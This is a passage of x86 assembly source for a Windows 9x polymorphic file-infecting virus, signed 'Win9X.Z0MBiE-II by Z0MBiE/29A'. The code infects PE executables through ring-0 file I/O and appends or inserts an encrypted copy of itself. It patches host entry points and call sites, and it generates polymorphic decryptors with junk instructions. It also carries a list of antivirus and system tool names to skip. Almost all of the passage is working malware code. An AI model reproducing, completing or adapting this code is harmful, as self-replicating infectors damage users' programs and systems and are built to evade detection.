                           mov     eax, @@vir_rva x y
                           add     eax, poly_entrypoint x
                           mov     pe.pe_entrypointrva x, eax

                           lea     edx, poly x
                           mov     ecx, vir_size_infile
                           mov     esi, @@vir_offset x y
                           mov     ebx, filehandle x
                           call    fwrite

                           ;;

                           mov     ecx, filename_ptr x
                           cmp     [ecx].byte ptr 0, 'C'
                           jb      __skip_sd

   ;                       mov     eax, [ecx].dword ptr 2
   ;                       or      eax, 20202000h
   ;                       cmp     eax, 'niw\'
   ;                       jne     __skip_sd

                           mov     esi, oeV.oe_phys_offs x
                           mov     ecx, oeV.oe_phys_size x
                           shr     ecx, sd_buf_size_log2

   __cycle_sd:             dec     ecx
                           jz      __skip_sd

                           push    ecx

                           lea     edx, sd_buf x
                           mov     ecx, sd_buf_size
                           mov     ebx, filehandle x
                           call    fread

                           lea     edi, sd_count x
                           mov     ecx, sd_count_size
                           xor     al, al
                           cld
                           rep     stosb

                           lea     ebx, sd_buf x
                           mov     ecx, sd_buf_size
                           xor     eax, eax
   __cycle_count:          mov     al, [ebx]
                           inc     ebx
                           inc     sd_count[eax*2] x
                           or      al, al
                           jz      __xxx
                           cmp     sd_count[eax*2] x, 512
                           ja      __bad_buf
   __xxx:                  loop    __cycle_count

                           cmp     sd_count[00h*2] x, 256
                           jb      __bad_buf
                           cmp     sd_count[089h*2] x, 30
                           jb      __bad_buf
                           cmp     sd_count[08Bh*2] x, 30
                           jb      __bad_buf
                           cmp     sd_count[0E8h*2] x, 10
                           jb      __bad_buf

                           call    random_ax
                           xchg    edi, eax

                           mov     ecx, sd_buf_size

   __find_cycle:           and     edi, sd_buf_size - 1

                           cmp     edi, sd_buf_size - 16
                           jae     __skip_find

                           cmp     word ptr sd_buf[edi+5] x, 0C483h
                           jne     __skip_find

                           cmp     sd_buf[edi] x, 0E8h
                           je      __place_found

   __skip_find:
                           inc     edi
                           loop    __find_cycle
                           jmp     __bad_buf

   __place_found:          mov     ecx, dword ptr sd_buf[edi+1] x
                           and     ecx, 0FFF80000h
                           jz      __good
                           cmp     ecx, 0FFF80000h
                           jne     __bad_buf

   __good:
                           mov     cl, byte ptr sd_buf[edi+3] x
                           and     cl, 1111b

                           call    random_ax
                           and     al, 0F0h

                           or      cl, al

                           mov     eax, esi
                           sub     eax, oeV.oe_phys_offs x
                           add     eax, oeV.oe_virt_rva x
                           add     eax, edi
                           xor     ax, word ptr sd_buf[edi+1] x

                           mov     word ptr sd_buf[edi+3] x, ax
                           mov     word ptr sd_buf[edi] x, 0ffffh

                           mov     sd_buf[edi+2] x, cl

                           call    random_ax
                           mov     word ptr sd_buf[edi+5] x, ax

                           lea     edx, sd_buf x
                           mov     ecx, sd_buf_size
                           mov     ebx, filehandle x
                           call    fwrite

   __bad_buf:              add     esi, sd_buf_size

                           pop     ecx
                           jmp     __cycle_sd

   __skip_sd:

   __method_2_exit:
   __set_stamp:
                           add     pe.pe_sizeofinitdata x, vir_size_infile

                           add     pe.pe_stackreservesize x, vir_size_infile*4
                           add     pe.pe_stackcommitsize  x, vir_size_infile*4

                           xor     eax, eax
                           mov     pe.pe_checksum x, eax

                           mov     pe.pe_datetime x, eax

                           lea     edx, pe x
                           mov     ecx, size pe
                           mov     esi, mz.mz_neptr x
                           mov     ebx, filehandle x
                           call    fwrite

   __close:                mov     ebx, filehandle x
                           call    fclose

   __restattr:             mov     edx, filename_ptr x
                           mov     ecx, dta.dta_fileattr x
                           call    fsetattr

   __exit:                 call    xor_copy

                           popa
                           ret

   __read_last_sect:       movzx   esi, pe.pe_numofobjects x  ; last section
                           dec     esi
                           imul    esi, size oe_struc
                           add     esi, mz.mz_neptr x
                           add     esi, size pe_struc

                           lea     edx, oeL x
                           mov     ecx, size oe_struc
                           mov     ebx, filehandle x
                           call    fread

                           ret

   __filealign:            mov     ebx, pe.pe_filealign x
                           dec     ebx
                           add     eax, ebx
                           not     ebx
                           and     eax, ebx
                           ret

   __objectalign:          mov     ebx, pe.pe_objectalign x
                           dec     ebx
                           add     eax, ebx
                           not     ebx
                           and     eax, ebx
                           ret

   __method_2:             call    __read_last_sect

                           mov     esi, mz.mz_neptr x
                           add     esi, size pe_struc

                           lea     edx, oe1 x
                           mov     ecx, size oe_struc
                           mov     ebx, filehandle x
                           call    fread

                           movzx   eax, pe.pe_numofobjects x
                           imul    eax, size oe_struc
                           add     esi, eax

                           mov     eax, oe1.oe_phys_offs x
                           sub     eax, esi

                           cmp     eax, size oe_struc
                           jb      __set_stamp

                           mov     eax, dta.dta_filesize x
                           call    __filealign
                           mov     oe1.oe_phys_offs x, eax

                           mov     eax, vir_size_infile
                           call    __filealign
                           mov     oe1.oe_phys_size x, eax

                           mov     eax, oeL.oe_virt_rva x
                           add     eax, oeL.oe_virt_size x
                           call    __objectalign
                           mov     oe1.oe_virt_rva x, eax

                           mov     @@saved_rel x y, eax

                           mov     eax, vir_size_infile
                           call    __objectalign
                           mov     oe1.oe_virt_size x, eax

                           mov     oe1.oe_section_flags x, 60000020h

                           mov     eax, pe.pe_entrypointrva x
                           mov     @@saveeip x y, eax

                           mov     eax, pe.pe_imagebase x
                           mov     @@imagebase x y, eax

                           mov     eax, oe1.oe_virt_rva x
                           add     eax, oe1.oe_virt_size x
                           call    __objectalign
                           mov     pe.pe_imagesize x, eax

                           mov     @@vir_type x y, 2

                           call    poly_engine

                           mov     eax, oe1.oe_virt_rva x
                           add     eax, poly_entrypoint x
                           mov     pe.pe_entrypointrva x, eax

                           inc     pe.pe_numofobjects x

                           lea     edx, oe1 x
                           mov     ecx, size oe_struc
                           mov     ebx, filehandle x
                           call    fwrite

                           lea     edx, poly x
                           mov     ecx, vir_size_infile
                           mov     esi, oe1.oe_phys_offs x
                           mov     ebx, filehandle x
                           call    fwrite

                           lea     edi, poly x
                           mov     ecx, vir_size_infile
                           xor     al, al
                           cld
                           rep     stosb

                           mov     edx, oe1.oe_phys_size x
                           sub     edx, vir_size_infile

   __22:                   or      edx, edx
                           jz      __11

                           mov     ecx, edx
                           cmp     ecx, vir_size_infile
                           jbe     __33
                           mov     ecx, vir_size_infile

   __33:                   push    edx
                           lea     edx, poly x
                           mov     ebx, filehandle x
                           call    fwrite
                           pop     edx

                           add     esi, ecx
                           sub     edx, ecx

                           jmp     __22
   __11:

                           jmp     __method_2_exit

   naebka_4:               jnc     naebka_5
   naebka_2:               jmp     naebka_3

   is_in_list:

   __next:                 pusha

                           mov     ecx, short_name_len+short_ext_len

   __2:                    mov     al, [esi]
                           mov     ah, [edi]

                           cmp     ah, '?'
                           je      __1
                           cmp     ah, 128
                           jae     __1

                           cmp     al, 'a'
                           jb      __4
                           cmp     al, 'z'
                           ja      __4
                           add     al, 'A'-'a'

   __4:                    cmp     al, ah
                           jne     __3             ; nz

   __1:                    inc     esi
                           inc     edi
                           loop    __2

                           xor     ecx, ecx        ; zr

   __3:                    popa
                           je      __found

                           add     edi, short_name_len+short_ext_len

                           cmp     byte ptr [edi], 0
                           jne     __next

                           clc
                           ret

   __found:                stc
                           ret

   _strlen:                push    edi
                           mov     ecx, -1
                           xor     al, al
                           cld
                           repnz   scasb
                           neg     ecx
                           dec     ecx
                           dec     ecx
                           pop     edi
                           ret

   access_ebx              equ     (dword ptr 16)
   access_edx              equ     (dword ptr 20)
   access_ecx              equ     (dword ptr 24)
   access_eax              equ     (dword ptr 28)

                           ; i: edx=filename
                           ; o: cf, eax=handle
   fopen:                  pusha
                           mov     eax, R0_OPENCREATFILE
                           mov     esi, edx
                           mov     bx, 2022h       ; no int 24, denywrite, r/w
                           mov     cx, 32          ; archive (unused here)
                           mov     dx, 01h         ; fail | open
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_eax, eax
                           popa
                           ret

                           ; i: edx=filename
                           ; o: cf, eax=handle
   fcreate:                pusha
                           mov     eax, R0_OPENCREATFILE
                           mov     esi, edx
                           mov     bx, 2022h       ; no int 24, denywrite, r/w
                           mov     cx, 32          ; archive
                           mov     dx, 12h         ; create | open/replace
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_eax, eax
                           popa
                           ret

                           ; i: edx=filename
   fdelete:                pusha
                           mov     eax, R0_DELETEFILE
                           mov     esi, edx
                           mov     cx, 2027h
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_eax, eax
                           popa
                           ret


                           ; i: ebx=handle
   fclose:                 pusha
                           mov     eax, R0_CLOSEFILE
                           VxDcall IFSMGR_Ring0_FileIO
                           popa
                           ret

                           ; i: ebx=handle
                           ;    edx=buffer
                           ;    ecx=size
                           ;    esi=file pos
                           ; o: ecx=bytes read
   fread:                  pusha
                           mov     eax, R0_READFILE
                           xchg    edx, esi
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_ecx, ecx
                           popa
                           ret

                           ; i: ebx=handle
                           ;    edx=buffer
                           ;    ecx=size
                           ;    esi=file pos
                           ; o: ecx=bytes written
   fwrite:                 pusha
                           mov     eax, R0_WRITEFILE
                           xchg    edx, esi
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_ecx, ecx
                           popa
                           ret

                           ; i: ebx=handle
                           ; o: eax=file size
   fgetsize:               pusha
                           mov     eax, R0_GETFILESIZE
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_eax, eax
                           popa
                           ret

                           ; i: edx=filename
                           ; o: ecx=fileattr
   ;fgetattr:               pusha
   ;                        mov     eax, R0_FILEATTRIBUTES + GET_ATTRIBUTES
   ;                        mov     esi, edx
   ;                        VxDcall IFSMGR_Ring0_FileIO
   ;                        mov     [esp].access_ecx, ecx
   ;                        popa
   ;                        ret

                           ; i: edx=filename
                           ;    ecx=fileattr
   fsetattr:               pusha
                           mov     eax, R0_FILEATTRIBUTES + SET_ATTRIBUTES
                           mov     esi, edx
                           VxDcall IFSMGR_Ring0_FileIO
                           popa
                           ret

                           ; i: edx=filemask
                           ;    ecx=attribs
                           ;    esi=find structure
                           ; o: cf, eax=findhandle
   ffindfirst:             pusha
                           mov     eax, R0_FINDFIRSTFILE
                           xchg    edx, esi
                           VxDcall IFSMGR_Ring0_FileIO
                           mov     [esp].access_eax, eax
                           popa
                           ret

                           ; i: eax=findhandle
                           ;    esi=find structure
                           ; o: cf
   ;ffindnext:              pusha
   ;                        xchg    ebx, eax
   ;                        mov     eax, R0_FINDFIRSTFILE
   ;                        mov     edx, esi
   ;                        VxDcall IFSMGR_Ring0_FileIO
   ;                        mov     [esp].access_eax, eax
   ;                        popa
   ;                        ret

                           ; i: eax=find handle
   ffindclose:             pusha
                           xchg    ebx, eax
                           mov     eax, R0_FINDCLOSEFILE
                           VxDcall IFSMGR_Ring0_FileIO
                           popa
                           ret

           IFDEF   DEBUG

   debug_beep_FREQ         equ     3300
   debug_beep_DELAY        equ     10*65536

   debug_beep:             push    eax
                           push    ecx

                           mov     al, 0B6h
                           out     43h, al

                           mov     al, (12345678h/debug_beep_FREQ) and 255
                           out     42h, al
                           mov     al, ((12345678h/debug_beep_FREQ) shr 16) and 255
                           out     42h, al

                           in      al, 61h
                           or      al, 3
                           out     61h, al

                           mov     ecx, debug_beep_DELAY
                           loop    $

                           in      al, 61h
                           and     al, not 3
                           out     61h, al

                           pop     ecx
                           pop     eax
                           ret
           ENDIF

   ;rnd_eax_ebx:            push    ebx
   ;                        cmp     eax, ebx
   ;                        jae     __1
   ;                        xchg    ebx, eax
   ;__1:                    sub     eax, ebx
   ;                        inc     eax
   ;                        call    rnd_eax
   ;                        add     eax, ebx
   ;                        pop     ebx
   ;                        ret

   rnd_eax:                push    ecx
                           push    edx
                           xchg    ecx, eax
                           call    random_eax
                           xor     edx, edx
                           jecxz   __1
                           div     ecx
   __1:                    xchg    edx, eax
                           pop     edx
                           pop     ecx
                           ret

   eblo                    equ     5051EB10h

   random_eax:             call    random_ax
                           rol     eax, 16
                           call    random_ax
                           rol     eax, 11
   xor_eblo:               xor     eax, eblo
                           ret

   random_ax:              push    bx
                           xor     bx, ax
                           xor     bx, cx
                           xor     bx, dx
                           xor     bx, sp
                           xor     bx, bp
                           xor     bx, si
                           xor     bx, di
                           in      al, 40h
                           xor     bl, al
                           in      al, 40h
                           add     bh, al
                           in      al, 41h
                           sub     bl, al
                           in      al, 41h
                           xor     bh, al
                           in      al, 42h
                           add     bl, al
                           in      al, 42h
                           sub     bh, al
                           xchg    bx, ax
                           pop     bx
                           ret

   poly_engine:            pusha

                           call    get_base_ebp

                           ;;

                           lea     edi, poly x
                           cld

                           call    random_eax
                           and     eax, 255
                           add     eax, 100
                           xchg    ecx, eax
   __a1:                   call    random_ax
                           stosb
                           loop    __a1

                           ;;

                           lea     eax, poly x
                           sub     eax, edi
                           neg     eax
                           mov     poly_entrypoint x, eax

                           ;;

                           mov     @@kbase x y, vir_size

                           mov     eax, 01010101h
                           mov     dword ptr push_num x, eax
                           mov     dword ptr push_num x + 4, eax

                           ;;

                           mov     edx, 6

   __1:                    call    get_rnd_reg
                           xchg    ecx, eax

                           cmp     push_num[ecx] x, 0
                           je      __1

                           mov     al, 0b8h
                           add     al, cl
                           stosb
                           call    random_eax
                           mov     em_eax[ecx*4] x, eax
                           stosd

                           mov     push_num[ecx] x, 0

                           call    poly_out_cmd

                           dec     edx
                           jnz     __1

                           ;;

                           lea     esi, vir_copy x
                           add     esi, vir_size
                           xor     ecx, ecx

   __cycle_1:
                           call    poly_out_cmd

                           call    get_rnd_reg
                           xchg    ebx, eax

                           xor     edx, edx

   __3:                    cmp     push_num[ebx] x, 0
                           je      __2

                           movzx   eax, regbuf[edx] x
                           inc     edx

                           mov     push_num[eax] x, 0

                           add     al, 50h
                           stosb

                           call    poly_out_cmd

                           jmp     __3

   __2:
                           pusha
                           lea     edi, regbuf x
                           lea     esi, [edi+edx]
                           movsd
                           movsd
                           popa
                           sub     ecx, edx


                           sub     esi, 4
                           mov     edx, [esi]

                           call    random_eax

                           and     eax, 3
                           jz      __x0
                           dec     eax
                           jz      __x1
                           dec     eax
                           jz      __x2

   __x3:                   call    poly_push_all

                           mov     al, 68h
                           stosb
                           xchg    edx, eax
                           stosd

                           jmp     __yy

   __x2:                   xor     edx, em_eax[ebx*4] x
                           mov     ax, 0F081h
                           xor     em_eax[ebx*4] x, edx

                           jmp     __xx

   __x1:                   sub     edx, em_eax[ebx*4] x
                           mov     ax, 0C081h
                           add     em_eax[ebx*4] x, edx

                           jmp     __xx

   __x0:                   sub     edx, em_eax[ebx*4] x
                           neg     edx
                           mov     ax, 0E881h
                           sub     em_eax[ebx*4] x, edx

   __xx:                   add     ah, bl
                           stosw
                           xchg    edx, eax
                           stosd

                           mov     regbuf[ecx] x, bl
                           inc     ecx

                           mov     push_num[ebx] x, 1

   __yy:                   lea     eax, vir_copy x
                           cmp     esi, eax
                           jne     __cycle_1

                           call    poly_push_all

                           ;;

                           call    poly_out_cmd

                           ;;

                           mov     ax, 0E4FFh  ; jmp esp
                           stosw

                           lea     ecx, poly x
                           add     ecx, vir_size_infile
                           sub     ecx, edi
   __a2:                   call    random_ax
                           stosb
                           loop    __a2

                           ;;

                           popa
                           ret

   xor_copy:               lea     esi, vir_copy x
                           mov     ecx, vir_size
   __1:                    xor     byte ptr [esi], cl
                           inc     esi
                           loop    __1
                           ret

   poly_push_all:          xor     ebx, ebx

   __2:                    cmp     ebx, ecx
                           je      __1

                           movzx   eax, regbuf[ebx] x
                           inc     ebx

                           mov     push_num[eax] x, 0

                           add     al, 50h
                           stosb

                           jmp     __2

   __1:                    xor     ecx, ecx

                           ret

   get_rnd_reg:            call    random_eax
                           and     eax, 7
                           cmp     al, 4           ; esp
                           je      get_rnd_reg
                           cmp     al, 5           ; ebp
                           je      get_rnd_reg
                           ret

   naebka_8:               call    naebka_1
                           jc      naebka_5
                           jmp     replace_buf

   poly_out_cmd:           push    eax ebx ecx edx  esi

                           cmp     dword ptr push_num x, 01010101h
                           jne     __1
                           cmp     word ptr push_num x + 4 + 2, 0101h
                           je      __ret

   __1:                    call    get_rnd_reg
                           cmp     push_num[eax] x, 0
                           jne     __1
                           mov     reg1 x, eax
                           xchg    ecx, eax

   __2:                    call    get_rnd_reg
                           cmp     push_num[eax] x, 0
                           jne     __2
                           mov     reg2 x, eax
                           xchg    edx, eax

   __rand:                 call    random_eax
                           and     eax, 31

                           or      eax, eax
                           jz      __x_0
                           dec     eax
                           jz      __x_1

                           jmp     __opt1

   __x_x_x:

   __ret:

                           pop     esi  edx ecx ebx eax

                           ret


   __x_0:                  cmp     ecx, edx        ; mov r1, r2
                           je      __rand

                           mov     eax, em_eax[edx*4] x
                           mov     em_eax[ecx*4] x, eax

                           mov     al, 89h

   __stosb:
                           stosb

                           mov     al, dl
                           shl     al, 3
                           or      al, cl
                           or      al, 0c0h
                           stosb

                           jmp     __x_x_x


   __x_1:                                          ; xor r1, r2
                           mov     eax, em_eax[edx*4] x
                           xor     em_eax[ecx*4] x, eax

                           mov     al, 31h
                           jmp     __stosb

   __x_2:                                          ; add r1, r2
                           mov     eax, em_eax[edx*4] x
                           add     em_eax[ecx*4] x, eax

                           mov     al, 01h
                           jmp     __stosb

   __x_3:                                          ; sub r1, r2
                           mov     eax, em_eax[edx*4] x
                           sub     em_eax[ecx*4] x, eax

                           mov     al, 29h
                           jmp     __stosb

   __x_4:                                             ; not r1
                           not     em_eax[ecx*4] x

                           mov     ax, 0d0f7h

   __orahclstosb:
                           or      ah, cl
                           stosw

                           jmp     __x_x_x


   __opt1:                 dec     eax
                           jz      __x_2
                           dec     eax
                           jz      __x_3
                           dec     eax
                           jz      __x_4

                           dec     eax
                           jz      __x_5
                           dec     eax
                           jz      __x_6
                           dec     eax
                           jz      __x_7
                           dec     eax
                           jz      __x_8

                           jmp     __opt2

   __x_5:                                             ; neg r1

                           neg     em_eax[ecx*4] x

                           mov     ax, 0d8f7h

                           jmp     __orahclstosb

   __x_6:
                                                      ; shl r1, 1
                           shl     em_eax[ecx*4] x, 1

                           mov     ax, 0e0d1h
                           jmp     __orahclstosb

   __x_7:                                             ; shr r1, 1

                           shr     em_eax[ecx*4] x, 1

                           mov     ax, 0e8d1h
                           jmp     __orahclstosb


   __x_8:                                             ; rol r1, 1
                           rol     em_eax[ecx*4] x, 1

                           mov     ax, 0c0d1h
                           jmp     __orahclstosb



   __x_9:                                             ; ror r1, 1
                           ror     em_eax[ecx*4] x, 1

                           mov     ax, 0c8d1h
                           jmp     __orahclstosb

   __x_10:                                            ; sar r1, 1
                           sar     em_eax[ecx*4] x, 1

                           mov     ax, 0f8d1h
                           jmp     __orahclstosb

   __x_11:                                            ; xchg r1, r2
                           mov     eax, em_eax[edx*4] x
                           xchg    em_eax[ecx*4] x, eax
                           mov     em_eax[edx*4] x, eax

                           mov     al, 87h
                           jmp     __stosb

   __x_12:                                         ; and r1, r2
                           mov     eax, em_eax[edx*4] x
                           and     em_eax[ecx*4] x, eax

                           mov     al, 21h
                           jmp     __stosb

   __opt2:                 dec     eax
                           jz      __x_9
                           dec     eax
                           jz      __x_10
                           dec     eax
                           jz      __x_11
                           dec     eax
                           jz      __x_12

                           dec     eax
                           jz      __x_13
                           dec     eax
                           jz      __x_14
                           dec     eax
                           jz      __x_15

   __x_x:                  jmp     __x_x_x

   __x_13:                                         ; or r1, r2
                           mov     eax, em_eax[edx*4] x
                           or      em_eax[ecx*4] x, eax

                           mov     al, 09h
                           jmp     __stosb

   __x_14:                                         ; inc r1

                           inc     em_eax[ecx*4] x

                           mov     al, 40h

   __oralclstosb:          or      al, cl
                           stosb

                           jmp     __x_x

   __x_15:                                         ; dec r1

                           dec     em_eax[ecx*4] x

                           mov     al, 48h

                           jmp     __oralclstosb

   replace_proc:           pusha
                           call    get_base_ebp
                           cld

                           mov     ebx, replace_buf_ptr x y
                           cmp     ebx, replace_buf_size - 16
                           ja      __exit
                           lea     eax, replace_buf x y
                           add     ebx, eax

                           mov     eax, replace_end - replace_start - 32
                           call    rnd_eax
                           lea     esi, replace_start[eax] x y

                           mov     ecx, 16

   __1:                    lodsb

                           cmp     al, 0E9h
                           je      __2
                           cmp     al, 0E8h
                           je      __2

                           loop    __1
                           jmp     __exit

   __2:                    lodsd
                           lea     edx, [eax+esi]

                           lea     ecx, replace_start x y
                           cmp     edx, ecx
                           jb      __exit
                           lea     ecx, replace_end   x y - 32
                           cmp     edx, ecx
                           ja      __exit

                           mov     eax, ebx
                           sub     eax, esi
                           mov     [esi-5].dword ptr 1, eax

                           mov     [ebx].byte ptr 0, 0E9h
                           lea     eax, [ebx+5]
                           sub     edx, eax
                           mov     [ebx].dword ptr 1, edx

                           add     replace_buf_ptr x y, 5

   __exit:                 popa
                           ret

   naebka_9:               jmp     naebka_8

   replace_buf_size        equ     1024
   replace_buf:            db      replace_buf_size dup (90h)

   replace_end:

   replace_buf_ptr         dd      0

   go_old_ifs_handler:     db      0b8h
   oldhandler_ptr_ptr      dd      ?
                           jmp     [eax]


   go_prev_fault:          db      68h
   fault_previous          dd      ?
                           ret

   naebka_7:               jmp     naebka_9

                                   ;1234567890123
   kewl_names:             db      'COMMAND??????'
                           db      0

   suck_names:             db      'AVP??¯à¨¢¥â??'
                           db      'WEB??¢á¥¬????'
                           db      'DRW??¢¨à¬í©ª¥'
                           db      'DSAV?????à ¬?'
                           db      'NOD???????EXE'
                           db      'NOD???????00?'
                           db      '??????????AVC'
                           db      '??????????VDB'
                           db      'WINICE    ???'
                           db      'FORMAT    COM'
                           db      'FDISK     EXE'
                           db      'SCANDSKW  EXE'
                           db      'DEFRAG    EXE'
                           db      0

   @@vir_type              db      0            ; 1/2
   @@is_dll                db      0

   @@imagebase             dd      ?            ; saved
   @@vir_offset            dd      ?            ; offset of virus in file
   @@vir_rva               dd      ?            ; virus rva in file
   @@saveeip               dd      ?            ; saved entrypoint rva
   @@orig_offs             dd      ?            ; where original data stored in file
   @@orig_rva              dd      ?
   @@codesect_pageaddr12   dd      ?
   @@codesect_pagecount    dd      ?
   @@codesect_flags        dd      ?
   @@decr_key              dd      ?
   @@saved_rel             dd      ?

    db 13,10
    db 'Win9X.Z0MBiE-II  by Z0MBiE/29A  X-)  Seek&Enjoy!  z0mbie_29a@yahoo.com',13,10
    db 'made in Moscow, Russia',13,10

    db '[S/N:'

   gen_number              macro   x
                           i       = 10000
                           k       = 5
                           j       = 0
                           rept    k
                           if      ((x / i) mod 10) ne 0
                           exitm
                           endif
                           j       = j + 1
                           i       = i / 10
                           endm
                           rept    k-j
                           db      ((x / i) mod 10) + '0'
                           i       = i / 10
                           endm
                           endm

    gen_number vir_size
    db '-'
    gen_number vir_size_infile
    db '-'
    gen_number vir_memory
    db '-'
    gen_number virPages

           IFDEF   DEBUG
    db '-DEBUG'
           ENDIF
    db ']'
    db 13,10

                           align   4
   end_of_code:
   vir_size                equ     end_of_code-start

   entered                 db      ?

   r0_idt                  df      ?

   kernel_base             dd      ?

   filename_ptr            dd      ?

   filename_size           equ     260
   filename                db      filename_size dup (?)

   short_name_len          equ     10
   short_ext_len           equ     3
   shortname               db      short_name_len+short_ext_len dup (?)

   filehandle              dd      ?

   dta                     dta_struc ?

   mz                      mz_struc ?
   pe                      pe_struc ?

   oe1                     oe_struc ?
   oeV_ptr                 dd      ?
   oeV                     oe_struc ?
   oeL                     oe_struc ?

   vir_copy                db      vir_size dup (?)

   sd_count                dw      256 dup (?)
   sd_count_size           equ     $-sd_count

   poly_entrypoint         dd      ?

   sd_buf_size             equ     4096
   sd_buf_size_log2        equ     12

   sd_buf                  label   byte
   orig_bytes              label   byte
   unp_dropper             label   byte

   poly                    db      vir_size_infile dup (?)

   em_eax                  dd      ?
   em_ecx                  dd      ?
   em_edx                  dd      ?
   em_ebx                  dd      ?
   em_esp                  dd      ?
   em_ebp                  dd      ?
   em_esi                  dd      ?
   em_edi                  dd      ?

   push_num                db      8 dup (?)

   reg1                    dd      ?
   reg2                    dd      ?

   regbuf                  db      16 dup (?)

   vir_memory              equ     $-start
   virPages                equ     (vir_memory + 4095) / 4096

                           end     start
